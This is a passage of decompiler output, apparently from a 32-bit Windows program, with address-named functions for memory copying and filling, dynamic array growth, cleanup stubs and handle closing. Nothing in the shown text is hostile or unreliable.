    int32_t v8 = v7; // 0x4011f4
    uint32_t v9 = (int32_t)(v7 / 0x100000000); // 0x4011f4
    uint32_t v10 = (int32_t)v6 * a4 + v9; // 0x4011f8
    if (v10 >= v9 && v10 <= a2) {
        // 0x401202
        if (v8 > a1 != v10 >= a2) {
            // 0x401221
            return a1 - v8;
        }
    }
    // 0x401221
    return a1 - (v8 - a3);
}

// Address range: 0x401230 - 0x40126d
int32_t function_401230(int32_t result) {
    // 0x401230
    int32_t v1; // 0x401230
    if (v1 < 0x1000) {
        // 0x401237
        *(int32_t *)0 = result;
        return result;
    }
    // 0x401245
    int32_t v2; // 0x401230
    int32_t v3 = v2;
    int32_t v4; // 0x401230
    int32_t v5 = &v4;
    int32_t v6 = v3 - 0x1000; // 0x401250
    int32_t v7 = v5 - 0x1000; // 0x40125c
    while (v6 >= 0x1000) {
        // 0x40124a
        v3 = v6;
        v5 = v7;
        v6 = v3 - 0x1000;
        v7 = v5 - 0x1000;
    }
    // 0x40125e
    *(int32_t *)(v5 - 4 - v3) = result;
    return result;
}

// Address range: 0x40126d - 0x401293
int32_t function_40126d(int32_t * a1, int32_t * a2, int32_t a3) {
    int32_t result = (int32_t)a1;
    if (a3 == 0) {
        // 0x40128e
        return result;
    }
    int32_t v1 = a3; // 0x40127c
    int32_t v2 = result; // 0x40127c
    int32_t v3 = (int32_t)a2; // 0x40127c
    v1--;
    *(char *)v2 = *(char *)v3;
    v2++;
    v3++;
    while (v1 != 0) {
        // 0x40127f
        v1--;
        *(char *)v2 = *(char *)v3;
        v2++;
        v3++;
    }
    // 0x40128e
    return result;
}

// Address range: 0x401293 - 0x4012c6
int32_t function_401293(int32_t * a1, int32_t a2, uint32_t a3) {
    int32_t result = (int32_t)a1;
    if (a3 != 0) {
        uint32_t v1 = 0x1000000 * a2 >> 24;
        uint32_t v2 = v1 % 256; // 0x40129b
        int32_t v3 = 256 * v2 | v2; // 0x4012a0
        uint32_t v4 = a3 / 4; // 0x4012ab
        __asm_rep_stosd_memset((char *)a1, 0x10000 * v3 | v3, v4);
        bool v5; // 0x401293
        int32_t v6 = v5 ? -4 : 4; // 0x4012b6
        __asm_rep_stosb_memset((char *)(v6 * v4 + result), (char)v1, a3 % 4);
    }
    // 0x4012c1
    return result;
}

// Address range: 0x4012c6 - 0x4012e8
int32_t function_4012c6(void) {
    uint32_t v1 = g306; // 0x4012c6
    int32_t result; // 0x4012c6
    if (v1 < g305) {
        // 0x4012d4
        *(int32_t *)(g260 + 4 * v1) = 0x418129;
        g306 = v1 + 1;
        result = g260;
    }
    // 0x4012e7
    return result;
}

// Address range: 0x4012e8 - 0x4012f7
int32_t function_4012e8(void) {
    // 0x4012e8
    function_41645d();
    return function_406e38();
}

// Address range: 0x4012f7 - 0x401306
int32_t function_4012f7(void) {
    // 0x4012f7
    function_417bbe();
    return function_406e38();
}

// Address range: 0x401306 - 0x401315
int32_t function_401306(void) {
    // 0x401306
    function_4102a4();
    return function_406e38();
}

// Address range: 0x401315 - 0x401324
int32_t function_401315(void) {
    // 0x401315
    function_40be01();
    return function_406e38();
}

// Address range: 0x401324 - 0x401333
int32_t function_401324(void) {
    // 0x401324
    function_41237d();
    return function_406e38();
}

// Address range: 0x401333 - 0x401355
int32_t function_401333(void) {
    uint32_t v1 = g306; // 0x401333
    int32_t result; // 0x401333
    if (v1 < g305) {
        // 0x401341
        *(int32_t *)(g260 + 4 * v1) = 0x418166;
        g306 = v1 + 1;
        result = g260;
    }
    // 0x401354
    return result;
}

// Address range: 0x401355 - 0x401364
int32_t function_401355(void) {
    // 0x401355
    function_410d4b();
    return function_406e38();
}

// Address range: 0x401364 - 0x401379
int32_t function_401364(void) {
    // 0x401364
    int32_t v1; // 0x401364
    function_414070(v1);
    return function_406e38();
}

// Address range: 0x401379 - 0x40139b
int32_t function_401379(void) {
    uint32_t v1 = g306; // 0x401379
    int32_t result; // 0x401379
    if (v1 < g305) {
        // 0x401387
        *(int32_t *)(g260 + 4 * v1) = 0x418184;
        g306 = v1 + 1;
        result = g260;
    }
    // 0x40139a
    return result;
}

// Address range: 0x40139b - 0x4013b9
int32_t function_40139b(unsigned char a1) {
    // 0x40139b
    int32_t result; // 0x40139b
    *(int32_t *)result = (int32_t)&g13;
    if (a1 % 2 != 0) {
        // 0x4013ad
        function_406f8d();
    }
    // 0x4013b2
    return result;
}

// Address range: 0x4013b9 - 0x4013d7
int32_t function_4013b9(unsigned char a1) {
    // 0x4013b9
    int32_t result; // 0x4013b9
    *(int32_t *)result = (int32_t)&g14;
    if (a1 % 2 != 0) {
        // 0x4013cb
        function_406f8d();
    }
    // 0x4013d0
    return result;
}

// Address range: 0x4013d7 - 0x4013fd
int32_t function_4013d7(void) {
    int32_t result = g160; // 0x4013d7
    if (result != 0) {
        // 0x4013fc
        return result;
    }
    int32_t result2 = 0; // 0x4013ea
    if (function_406fa7() != 0) {
        // 0x4013ec
        result2 = function_4099d9();
    }
    // 0x4013f7
    g160 = result2;
    // 0x4013fc
    return result2;
}

// Address range: 0x4013fd - 0x401419
int32_t function_4013fd(void) {
    int32_t v1 = function_404081(); // 0x401403
    int32_t v2; // 0x4013fd
    int32_t hObject = *(int32_t *)(v2 + 12); // 0x401408
    int32_t handleClosed = v1; // 0x40140c
    if (hObject != 0) {
        // 0x40140e
        handleClosed = CloseHandle((int32_t *)hObject);
    }
    // 0x401417
    return handleClosed;
}

// Address range: 0x401419 - 0x401460
int32_t function_401419(int32_t * a1) {
    // 0x401419
    int32_t result; // 0x401419
    *(int32_t *)(result + 12) = 5;
    *(int32_t *)(result + 4) = 5;
    *(int32_t *)(result + 8) = 0;
    function_401719();
    int32_t * v1 = (int32_t *)((int32_t)a1 + 8); // 0x401437
    if (*v1 == 0) {
        // 0x401457
        return result;
    }
    // 0x40143c
    int32_t v2; // bp-16, 0x401419
    int32_t v3 = &v2; // 0x401444
    for (int32_t i = 0; i < *v1; i++) {
        int32_t v4 = v3;
        *(int32_t *)(v4 - 20) = i;
        v3 = v4 - 24;
        *(int32_t *)v3 = v4 - 16;
        function_401766((int32_t)&g322, (int32_t)&g322);
        function_401618((int32_t)&g322, (int32_t)&g322, (int32_t)&g322, (int32_t)&g322);
    }
    // 0x401457
    return result;
}

// Address range: 0x401460 - 0x40147b
int32_t function_401460(void) {
    // 0x401460
    int32_t v1; // 0x401460
    if (v1 != 0) {
        // 0x401469
        function_401cab();
    }
    // 0x40146f
    *(int32_t *)v1 = 0;
    *(int32_t *)(v1 + 8) = 0;
    *(int32_t *)(v1 + 4) = 0;
    return 0;
}

// Address range: 0x40147b - 0x4014c2
int32_t function_40147b(int32_t * a1) {
    // 0x40147b
    int32_t result; // 0x40147b
    *(int32_t *)(result + 12) = 5;
    *(int32_t *)(result + 4) = 5;
    *(int32_t *)(result + 8) = 0;
    function_4018ac();
    int32_t * v1 = (int32_t *)((int32_t)a1 + 8); // 0x401499
    if (*v1 == 0) {
        // 0x4014b9
        return result;
    }
    // 0x40149e
    int32_t v2; // bp-16, 0x40147b
    int32_t v3 = &v2; // 0x4014a6
    for (int32_t i = 0; i < *v1; i++) {
        int32_t v4 = v3;
        *(int32_t *)(v4 - 16) = i;
        v3 = v4 - 20;
        *(int32_t *)v3 = v4 - 12;
        function_4018fe((int32_t)&g322, (int32_t)&g322);
        function_4017a5((int32_t)&g322);
    }
    // 0x4014b9
    return result;
}

// Address range: 0x4014c2 - 0x4014dd
int32_t function_4014c2(void) {
    // 0x4014c2
    int32_t v1; // 0x4014c2
    if (v1 != 0) {
        // 0x4014cb
        function_401cdf();
    }
    // 0x4014d1
    *(int32_t *)v1 = 0;
    *(int32_t *)(v1 + 8) = 0;
    *(int32_t *)(v1 + 4) = 0;
    return 0;
}

// Address range: 0x4014dd - 0x401524
int32_t function_4014dd(int32_t * a1) {
    // 0x4014dd
    int32_t result; // 0x4014dd
    *(int32_t *)(result + 12) = 5;
    *(int32_t *)(result + 4) = 5;
    *(int32_t *)(result + 8) = 0;
    function_401a34();
    int32_t * v1 = (int32_t *)((int32_t)a1 + 8); // 0x4014fb
    if (*v1 == 0) {
        // 0x40151b
        return result;
    }
    // 0x401500
    int32_t v2; // bp-16, 0x4014dd
    int32_t v3 = &v2; // 0x401508
    for (int32_t i = 0; i < *v1; i++) {
        int32_t v4 = v3;
        *(int32_t *)(v4 - 16) = i;
        v3 = v4 - 20;
        *(int32_t *)v3 = v4 - 12;
        function_401a81((int32_t)&g322, (int32_t)&g322);
        function_40193f((int32_t)&g322, (int32_t)&g322, (int32_t)&g322);
    }
    // 0x40151b
    return result;
}

// Address range: 0x401524 - 0x40153f
int32_t function_401524(void) {
    // 0x401524
    int32_t v1; // 0x401524
    if (v1 != 0) {
        // 0x40152d
        function_401d0e();
    }
    // 0x401533
    *(int32_t *)v1 = 0;
    *(int32_t *)(v1 + 8) = 0;
    *(int32_t *)(v1 + 4) = 0;
    return 0;
}

// Address range: 0x40153f - 0x401586
int32_t function_40153f(int32_t * a1) {
    // 0x40153f
    int32_t result; // 0x40153f
    *(int32_t *)(result + 12) = 5;
    *(int32_t *)(result + 4) = 5;
    *(int32_t *)(result + 8) = 0;
    function_401bbd();
    int32_t * v1 = (int32_t *)((int32_t)a1 + 8); // 0x40155d
    if (*v1 == 0) {
        // 0x40157d
        return result;
    }
    // 0x401562
    int32_t v2; // bp-16, 0x40153f
    int32_t v3 = &v2; // 0x40156a
    for (int32_t i = 0; i < *v1; i++) {
        int32_t v4 = v3;
        *(int32_t *)(v4 - 28) = i;
        v3 = v4 - 32;
        *(int32_t *)v3 = v4 - 24;
        function_401c0a((int32_t)&g322, (int32_t)&g322);
        function_401abc((int32_t)&g322, (int32_t)&g322, (int32_t)&g322, (int32_t)&g322);
    }
    // 0x40157d
    return result;
}

// Address range: 0x401586 - 0x4015a1
int32_t function_401586(void) {
    // 0x401586
    int32_t v1; // 0x401586
    if (v1 != 0) {
        // 0x40158f
        function_401d40();
    }
    // 0x401595
    *(int32_t *)v1 = 0;
    *(int32_t *)(v1 + 8) = 0;
    *(int32_t *)(v1 + 4) = 0;
    return 0;
}

// Address range: 0x4015a1 - 0x4015d4
int32_t function_4015a1(void) {
    // 0x4015a1
    function_406f1d();
    int32_t v1; // 0x4015a1
    *(int32_t *)(v1 + 12) = 0;
    function_406f1d();
    *(int32_t *)(v1 + 8) = 0;
    function_406f1d();
    *(int32_t *)(v1 + 4) = 0;
    int32_t result = function_406f1d(); // 0x4015ca
    *(int32_t *)v1 = 0;
    return result;
}

// Address range: 0x4015d4 - 0x4015fb
int32_t function_4015d4(void) {
    // 0x4015d4
    function_406f1d();
    int32_t v1; // 0x4015d4
    *(int32_t *)(v1 + 8) = 0;
    function_406f1d();
    *(int32_t *)(v1 + 4) = 0;
    int32_t result = function_406f1d(); // 0x4015f1
    *(int32_t *)v1 = 0;
    return result;
}

// Address range: 0x4015fb - 0x401618
int32_t function_4015fb(void) {
    // 0x4015fb
    function_406f1d();
    int32_t v1; // 0x4015fb
    *(int32_t *)(v1 + 8) = 0;
    int32_t result = function_406f1d(); // 0x40160d
    *(int32_t *)(v1 + 4) = 0;
    return result;
}

// Address range: 0x401618 - 0x401719
int32_t function_401618(int32_t a1, int32_t a2, int32_t a3, int32_t a4) {
    int32_t v1 = a1;
    int32_t v2; // 0x401618
    int32_t * v3 = (int32_t *)(v2 + 8); // 0x401622
    uint32_t v4 = *v3; // 0x401622
    int32_t * v5 = (int32_t *)(v2 + 4); // 0x401625
    int32_t v6; // bp-28, 0x401618
    int32_t v7 = &v6; // 0x401628
    int32_t v8 = v4; // 0x401628
    int32_t v9; // 0x401618
    if (v4 >= *v5) {
        int32_t v10 = *(int32_t *)(v2 + 12) * (v4 + 1); // 0x401632
        int32_t v11 = function_406fa7(); // 0x401653
        int32_t v12; // 0x401618
        int32_t v13; // 0x401618
        if (v11 == 0) {
            uint32_t v14 = v10 > 0xfffffff ? -1 : 16 * v10; // 0x401647
            v13 = 0;
            v12 = v14 > 0xfffffffb ? -1 : v14 + 4;
        } else {
            int32_t v15 = v11 + 4; // 0x40165c
            *(int32_t *)v11 = v10;
            int32_t v16 = v15; // 0x40166c
            v13 = v15;
            v12 = 0;
            if (v10 != 0) {
                *(int32_t *)v16 = 0;
                int32_t v17 = v10 - 1; // 0x401673
                int32_t v18 = v17; // 0x401676
                v16 += 16;
                v13 = v15;
                v12 = v17;
                while (v17 != 0) {
                    // 0x40166e
                    *(int32_t *)v16 = 0;
                    v17 = v18 - 1;
                    v18 = v17;
                    v16 += 16;
                    v13 = v15;
                    v12 = v17;
                }
            }
        }
        // 0x401681
        int32_t v19; // bp-32, 0x401618
        int32_t v20 = &v19; // 0x401638
        int32_t v21 = v12; // 0x401686
        int32_t v22 = v20; // 0x401686
        int32_t v23 = 0; // 0x401686
        if (*v3 != 0) {
            int32_t v24 = v13 + 8; // 0x401695
            int32_t v25 = 0; // 0x401695
            int32_t v26 = v20; // 0x401695
            int32_t v27 = -8 - v13 + 2 * v24;
            v26 -= 4;
            *(int32_t *)v26 = v27 - 8;
            function_4043c7(v24);
            v25++;
            *(int32_t *)(v24 - 4) = *(int32_t *)(v27 - 4);
            *(int32_t *)v24 = *(int32_t *)v27;
            *(int32_t *)(v24 + 4) = *(int32_t *)(v27 + 4);
            v24 += 16;
            uint32_t v28 = *v3; // 0x4016be
            v21 = v24;
            v22 = v26;
            v23 = v28;
            while (v25 < v28) {
                // 0x401698
                v27 = -8 - v13 + 2 * v24;
                v26 -= 4;
                *(int32_t *)v26 = v27 - 8;
                function_4043c7(v24);
                v25++;
                *(int32_t *)(v24 - 4) = *(int32_t *)(v27 - 4);
                *(int32_t *)v24 = *(int32_t *)v27;
                *(int32_t *)(v24 + 4) = *(int32_t *)(v27 + 4);
                v24 += 16;
                v28 = *v3;
                v21 = v24;
                v22 = v26;
                v23 = v28;
            }
        }
        int32_t v29 = v22; // 0x4016d2
        v8 = v23;
        if (v21 != 0) {
            // 0x4016d4
            v29 = v22 - 4;
            *(int32_t *)v29 = v21;
            function_401cab();
            v8 = *v3;
        }
        // 0x4016dd
        *(int32_t *)v2 = v13;
        *v5 = v10;
        v9 = v21;
        v7 = v29 + 4;
    }
    int32_t v30 = 16 * v8 + v9; // 0x4016ec
    *(int32_t *)(v7 - 4) = (int32_t)&v1;
    function_4043c7((int32_t)&g322);
    *(int32_t *)(v30 + 4) = a2;
    *(int32_t *)(v30 + 8) = a3;
    *(int32_t *)(v30 + 12) = a4;
    *v3 = *v3 + 1;
    return function_406f1d();
}

// Address range: 0x401719 - 0x401766
int32_t function_401719(void) {
    // 0x401719
    int32_t v1; // 0x401719
    int32_t v2 = *(int32_t *)(v1 + 4); // 0x401723
    int32_t v3 = function_406fa7(); // 0x40173d
    if (v3 == 0) {
        int32_t result = 0;
        *(int32_t *)v1 = result;
        return result;
    }
    // 0x401746
    *(int32_t *)v3 = v2;
    int32_t result2 = v3 + 4; // 0x401748
    int32_t v4 = result2; // 0x40174f
    int32_t v5 = v2; // 0x40174f
    if (v2 == 0) {
        // 0x401760
        *(int32_t *)v1 = result2;
        return result2;
    }
    *(int32_t *)v4 = 0;
    v5--;
    v4 += 16;
    while (v5 != 0) {
        // 0x401751
        *(int32_t *)v4 = 0;
        v5--;
        v4 += 16;
    }
    // 0x401760
    *(int32_t *)v1 = result2;
    return result2;
}

// Address range: 0x401766 - 0x4017a5
int32_t function_401766(int32_t result, uint32_t a2) {
    // 0x401766
    int32_t v1; // 0x401766
    int32_t v2 = v1;
    function_406d65();
    int32_t v3 = (v2 & -256 | (int32_t)(*(int32_t *)(v2 + 8) > a2)) + 16 * a2; // 0x40177e
    function_404656(v3);
    *(int32_t *)(result + 4) = *(int32_t *)(v3 | 4);
    *(int32_t *)(result + 8) = *(int32_t *)(v3 | 8);
    *(int32_t *)(result + 12) = *(int32_t *)(v3 | 12);
    return result;
}

// Address range: 0x4017a5 - 0x4018ac
int32_t function_4017a5(int32_t a1) {
    // 0x4017a5
    int32_t v1; // 0x4017a5
    int32_t * v2 = (int32_t *)(v1 + 8); // 0x4017af
    uint32_t v3 = *v2; // 0x4017af
    int32_t * v4 = (int32_t *)(v1 + 4); // 0x4017b2
    int32_t v5 = v3; // 0x4017b5
    int32_t v6; // bp-28, 0x4017a5
    int32_t v7 = &v6; // 0x4017b5
    int32_t v8; // 0x4017a5
    if (v3 >= *v4) {
        int32_t v9 = *(int32_t *)(v1 + 12) * (v3 + 1); // 0x4017be
        int32_t v10 = function_406fa7(); // 0x4017e2
        int32_t v11 = 0; // 0x4017eb
        if (v10 != 0) {
            // 0x4017ed
            *(int32_t *)v10 = v9;
            int32_t v12 = v10 + 4; // 0x4017ef
            v11 = v12;
            if (v9 != 0) {
                int32_t v13 = v10 + 12;
                *(int32_t *)(v10 + 8) = 0;
                *(int32_t *)v13 = 0;
                int32_t v14 = v9 - 1; // 0x401806
                int32_t v15 = v13; // 0x401809
                int32_t v16 = v14; // 0x401809
                v11 = v12;
                while (v14 != 0) {
                    // 0x4017fe
                    v13 = v15 + 12;
                    *(int32_t *)(v15 + 8) = 0;
                    *(int32_t *)v13 = 0;
                    v14 = v16 - 1;
                    v15 = v13;
                    v16 = v14;
                    v11 = v12;
                }
            }
        }
        // 0x401812
        int32_t v17; // bp-32, 0x4017a5
        int32_t v18 = &v17; // 0x4017c7
        int32_t v19 = 0; // 0x401817
        int32_t v20 = v11; // 0x401817
        int32_t v21 = v18; // 0x401817
        if (*v2 != 0) {
            int32_t v22 = 0; // 0x401824
            int32_t v23 = v18; // 0x401824
            int32_t v24 = v11 + 8;
            int32_t v25 = 2 * v24 + -8 - v11; // 0x40182c
            *(int32_t *)(v24 - 8) = *(int32_t *)v25;
            *(int32_t *)(v23 - 4) = v25 + 4;
            function_4043c7(v24);
            v23 -= 8;
            *(int32_t *)v23 = v25 + 8;
            function_4043c7((int32_t)&g322);
            uint32_t v26 = *v2; // 0x40184d
            v22++;
            int32_t v27 = v24 + 12; // 0x40185c
            v19 = v26;
            v20 = v24;
            v21 = v23;
            while (v22 < v26) {
                // 0x401827
                v24 = v27;
                v25 = 2 * v24 + -8 - v11;
                *(int32_t *)(v24 - 8) = *(int32_t *)v25;
                *(int32_t *)(v23 - 4) = v25 + 4;
                function_4043c7(v24);
                v23 -= 8;
                *(int32_t *)v23 = v25 + 8;
                function_4043c7((int32_t)&g322);
                v26 = *v2;
                v22++;
                v27 = v24 + 12;
                v19 = v26;
                v20 = v24;
                v21 = v23;
            }
        }
        // 0x401861
        v5 = v19;
        v7 = v21 + 4;
        if (v20 != 0) {
            // 0x401868
            *(int32_t *)v21 = v20;
            function_401cdf();
            v5 = *v2;
            v7 = v21;
        }
        // 0x401871
        *(int32_t *)v1 = v11;
        *v4 = v9;
        v8 = v11;
    }
    // 0x401879
    *(int32_t *)(12 * v5 + v8) = a1;
    int32_t v28; // 0x4017a5
    *(int32_t *)(v7 - 4) = (int32_t)&v28;
    function_4043c7((int32_t)&g322);
    int32_t v29; // bp+12, 0x4017a5
    *(int32_t *)(v7 - 8) = (int32_t)&v29;
    function_4043c7((int32_t)&g322);
    *v2 = *v2 + 1;
    return function_4015fb();
}

// Address range: 0x4018ac - 0x4018fe
int32_t function_4018ac(void) {
    // 0x4018ac
    int32_t v1; // 0x4018ac
    int32_t v2 = *(int32_t *)(v1 + 4); // 0x4018b6
    int32_t result = function_406fa7(); // 0x4018d0
    if (result == 0) {
        // 0x4018f8
        *(int32_t *)v1 = 0;
        return 0;
    }
    // 0x4018d9
    *(int32_t *)result = v2;
    int32_t v3 = result + 4; // 0x4018db
    if (v2 == 0) {
        // 0x4018f8
        *(int32_t *)v1 = v3;
        return result;
    }
    int32_t result2 = result + 12; // 0x4018e2
    int32_t v4 = v2; // 0x4018e2
    *(int32_t *)(result2 - 4) = 0;
    *(int32_t *)result2 = 0;
    result2 += 12;
    v4--;
    while (v4 != 0) {
        // 0x4018e5
        *(int32_t *)(result2 - 4) = 0;
        *(int32_t *)result2 = 0;
        result2 += 12;
        v4--;
    }
    // 0x4018f8
    *(int32_t *)v1 = v3;
    return result2;
}

// Address range: 0x4018fe - 0x40193f
int32_t function_4018fe(int32_t result, uint32_t a2) {
    // 0x4018fe
    int32_t v1; // 0x4018fe
    int32_t v2 = v1;
    function_406d65();
    int32_t v3 = (v2 & -256 | (int32_t)(*(int32_t *)(v2 + 8) > a2)) + 12 * a2; // 0x401916
    *(int32_t *)result = *(int32_t *)v3;
    function_404656(v3 + 4);
    function_404656(v3 + 8);
    return result;
}

// Address range: 0x40193f - 0x401a34
int32_t function_40193f(int32_t a1, int32_t a2, int32_t a3) {
    int32_t v1 = a1;
    int32_t v2; // 0x40193f
    int32_t * v3 = (int32_t *)(v2 + 8); // 0x401949
    uint32_t v4 = *v3; // 0x401949
    int32_t * v5 = (int32_t *)(v2 + 4); // 0x40194c
    int32_t v6 = v4; // 0x40194f
    int32_t v7; // bp-28, 0x40193f
    int32_t v8 = &v7; // 0x40194f
    int32_t v9; // 0x40193f
    if (v4 >= *v5) {
        int32_t v10 = *(int32_t *)(v2 + 12) * (v4 + 1); // 0x401958
        int32_t v11 = function_406fa7(); // 0x40197c
        int32_t v12 = 0; // 0x401985
        if (v11 != 0) {
            // 0x401987
            *(int32_t *)v11 = v10;
            int32_t v13 = v11 + 4; // 0x401989
            int32_t v14 = v13; // 0x401995
            v12 = v13;
            if (v10 != 0) {
                *(int32_t *)v14 = 0;
                int32_t v15 = v10 - 1; // 0x40199c
                v14 += 12;
                int32_t v16 = v15; // 0x40199f
                v12 = v13;
                while (v15 != 0) {
                    // 0x401997
                    *(int32_t *)v14 = 0;
                    v15 = v16 - 1;
                    v14 += 12;
                    v16 = v15;
                    v12 = v13;
                }
            }
        }
        // 0x4019a8
        int32_t v17; // bp-32, 0x40193f
        int32_t v18 = &v17; // 0x401961
        int32_t v19 = 0; // 0x4019ad
        v6 = 0;
        int32_t v20 = v18; // 0x4019ad
        if (*v3 != 0) {
            int32_t v21 = -8 - v12; // 0x4019b5
            int32_t v22 = v12 + 8; // 0x4019bc
            int32_t v23 = 0; // 0x4019bc
            int32_t v24 = v18;
            int32_t v25 = v22 + 2 * v21; // 0x4019c2
            int32_t v26 = v24 - 4; // 0x4019c7
            *(int32_t *)v26 = v25;
            function_4043c7(v22);
            v23++;
            *(int32_t *)(v22 - 4) = *(int32_t *)(v25 + 4);
            *(int32_t *)v22 = *(int32_t *)(v25 + 8);
            uint32_t v27 = *v3; // 0x4019e2
            v22 += 12;
            while (v23 < v27) {
                // 0x4019bf
                v24 = v26;
                v25 = v22 + 2 * v21;
                v26 = v24 - 4;
                *(int32_t *)v26 = v25;
                function_4043c7(v22);
                v23++;
                *(int32_t *)(v22 - 4) = *(int32_t *)(v25 + 4);
                *(int32_t *)v22 = *(int32_t *)(v25 + 8);
                v27 = *v3;
                v22 += 12;
            }
            // 0x4019f2
            v19 = 0;
            v6 = v27;
            v20 = v26;
            if (v21 != 0) {
                int32_t v28 = v24 - 8; // 0x4019f8
                *(int32_t *)v28 = v21;
                function_401d0e();
                v19 = v21;
                v6 = *v3;
                v20 = v28;
            }
        }
        // 0x401a01
        *(int32_t *)v2 = v12;
        *v5 = v10;
        v9 = v19;
        v8 = v20 + 4;
    }
    // 0x401a07
    *(int32_t *)(v8 - 4) = (int32_t)&v1;
    int32_t v29 = 12 * v6 + v9; // 0x401a0e
    function_4043c7((int32_t)&g322);
    *(int32_t *)(v29 + 4) = a2;
    *(int32_t *)(v29 + 8) = a3;
    *v3 = *v3 + 1;
    return function_406f1d();
}

// Address range: 0x401a34 - 0x401a81
int32_t function_401a34(void) {
    // 0x401a34
    int32_t v1; // 0x401a34
    int32_t v2 = *(int32_t *)(v1 + 4); // 0x401a3e
    int32_t v3 = function_406fa7(); // 0x401a58
    if (v3 == 0) {
        int32_t result = 0;
        *(int32_t *)v1 = result;
        return result;
    }
    // 0x401a61
    *(int32_t *)v3 = v2;
    int32_t result2 = v3 + 4; // 0x401a63
    int32_t v4 = result2; // 0x401a6a
    int32_t v5 = v2; // 0x401a6a
    if (v2 == 0) {
        // 0x401a7b
        *(int32_t *)v1 = result2;
        return result2;
    }
    *(int32_t *)v4 = 0;
    v5--;
    v4 += 12;
    while (v5 != 0) {
        // 0x401a6c
        *(int32_t *)v4 = 0;
        v5--;
        v4 += 12;
    }
    // 0x401a7b
    *(int32_t *)v1 = result2;
    return result2;
}

// Address range: 0x401a81 - 0x401abc
int32_t function_401a81(int32_t result, int32_t a2) {
    // 0x401a81
    function_406d65();
    int32_t v1 = 12 * a2 + result; // 0x401a9f
    function_404656(v1);
    *(int32_t *)(result + 4) = *(int32_t *)(v1 + 4);
    *(int32_t *)(result + 8) = *(int32_t *)(v1 + 8);
    return result;
}

// Address range: 0x401abc - 0x401bbd
int32_t function_401abc(int32_t a1, int32_t a2, int32_t a3, int32_t a4) {
    int32_t v1 = a1;
    int32_t v2; // 0x401abc
    int32_t * v3 = (int32_t *)(v2 + 8); // 0x401ac6
    uint32_t v4 = *v3; // 0x401ac6
    int32_t * v5 = (int32_t *)(v2 + 4); // 0x401ac9
    int32_t v6 = v4; // 0x401acc
    int32_t v7; // bp-28, 0x401abc
    int32_t v8 = &v7; // 0x401acc
    int32_t v9; // 0x401abc
    if (v4 >= *v5) {
        int32_t v10 = *(int32_t *)(v2 + 12) * (v4 + 1); // 0x401ad5
        int32_t v11 = function_406fa7(); // 0x401af9
        int32_t v12 = 0; // 0x401b02
        if (v11 != 0) {
            // 0x401b04
            *(int32_t *)v11 = v10;
            int32_t v13 = v11 + 4; // 0x401b06
            int32_t v14 = v13; // 0x401b12
            v12 = v13;
            if (v10 != 0) {
                *(int32_t *)v14 = 0;
                int32_t v15 = v10 - 1; // 0x401b19
                v14 += 24;
                int32_t v16 = v15; // 0x401b1c
                v12 = v13;
                while (v15 != 0) {
                    // 0x401b14
                    *(int32_t *)v14 = 0;
                    v15 = v16 - 1;
                    v14 += 24;
                    v16 = v15;
                    v12 = v13;
                }
            }
        }
        // 0x401b25
        int32_t v17; // bp-32, 0x401abc
        int32_t v18 = &v17; // 0x401ade
        int32_t v19 = 0; // 0x401b2a
        v6 = 0;
        int32_t v20 = v18; // 0x401b2a
        if (*v3 != 0) {
            int32_t v21 = -16 - v12; // 0x401b32
            int32_t v22 = v12 + 16; // 0x401b39
            int32_t v23 = 0; // 0x401b39
            int32_t v24 = v18;
            int32_t v25 = v22 + 2 * v21; // 0x401b3f
            int32_t v26 = v24 - 4; // 0x401b44
            *(int32_t *)v26 = v25;
            function_4043c7(v22);
            v23++;
            *(int32_t *)(v22 - 4) = *(int32_t *)(v25 + 12);
            *(int32_t *)(v22 - 8) = *(int32_t *)(v25 + 8);
            *(int32_t *)v22 = *(int32_t *)(v25 + 16);
            uint32_t v27 = *v3; // 0x401b65
            v22 += 24;
            while (v23 < v27) {
                // 0x401b3c
                v24 = v26;
                v25 = v22 + 2 * v21;
                v26 = v24 - 4;
                *(int32_t *)v26 = v25;
                function_4043c7(v22);
                v23++;
                *(int32_t *)(v22 - 4) = *(int32_t *)(v25 + 12);
                *(int32_t *)(v22 - 8) = *(int32_t *)(v25 + 8);
                *(int32_t *)v22 = *(int32_t *)(v25 + 16);
                v27 = *v3;
                v22 += 24;
            }
            // 0x401b75
            v19 = 0;
            v6 = v27;
            v20 = v26;
            if (v21 != 0) {
                int32_t v28 = v24 - 8; // 0x401b7b
                *(int32_t *)v28 = v21;
                function_401d40();
                v19 = v21;
                v6 = *v3;
                v20 = v28;
            }
        }
        // 0x401b84
        *(int32_t *)v2 = v12;
        *v5 = v10;
        v9 = v19;
        v8 = v20 + 4;
    }
    // 0x401b8a
    *(int32_t *)(v8 - 4) = (int32_t)&v1;
    int32_t v29 = 24 * v6 + v9; // 0x401b91
    function_4043c7((int32_t)&g322);
    *(int32_t *)(v29 + 8) = a2;
    *(int32_t *)(v29 + 12) = a3;
    *(int32_t *)(v29 + 16) = a4;
    *v3 = *v3 + 1;
    return function_406f1d();
}

// Address range: 0x401bbd - 0x401c0a
int32_t function_401bbd(void) {
    // 0x401bbd
    int32_t v1; // 0x401bbd
    int32_t v2 = *(int32_t *)(v1 + 4); // 0x401bc7
    int32_t v3 = function_406fa7(); // 0x401be1
    if (v3 == 0) {
        int32_t result = 0;
        *(int32_t *)v1 = result;
        return result;
    }
    // 0x401bea
    *(int32_t *)v3 = v2;
    int32_t result2 = v3 + 4; // 0x401bec
    int32_t v4 = result2; // 0x401bf3
    int32_t v5 = v2; // 0x401bf3
    if (v2 == 0) {
        // 0x401c04
        *(int32_t *)v1 = result2;
        return result2;
    }
    *(int32_t *)v4 = 0;
    v5--;
    v4 += 24;
    while (v5 != 0) {
        // 0x401bf5
        *(int32_t *)v4 = 0;
        v5--;
        v4 += 24;
    }
    // 0x401c04
    *(int32_t *)v1 = result2;
    return result2;
}

// Address range: 0x401c0a - 0x401c4b
int32_t function_401c0a(int32_t result, int32_t a2) {
    // 0x401c0a
    function_406d65();
    int32_t v1 = 24 * a2 + result; // 0x401c28
    function_404656(v1);
    *(int32_t *)(result + 8) = *(int32_t *)(v1 + 8);
    *(int32_t *)(result + 12) = *(int32_t *)(v1 + 12);
    *(int32_t *)(result + 16) = *(int32_t *)(v1 + 16);
    return result;
}

// Address range: 0x401c4b - 0x401c7a
int32_t function_401c4b(void) {
    // 0x401c4b
    int32_t v1; // 0x401c4b
    int32_t result = v1 - 4; // 0x401c4d
    int32_t v2 = *(int32_t *)result; // 0x401c50
    int32_t v3 = v2; // 0x401c5a
    if (v2 == 0) {
        // 0x401c6b
        function_406f8d();
        return result;
    }
    function_4015a1();
    v3--;
    while (v3 != 0) {
        // 0x401c5c
        function_4015a1();
        v3--;
    }
    // 0x401c6b
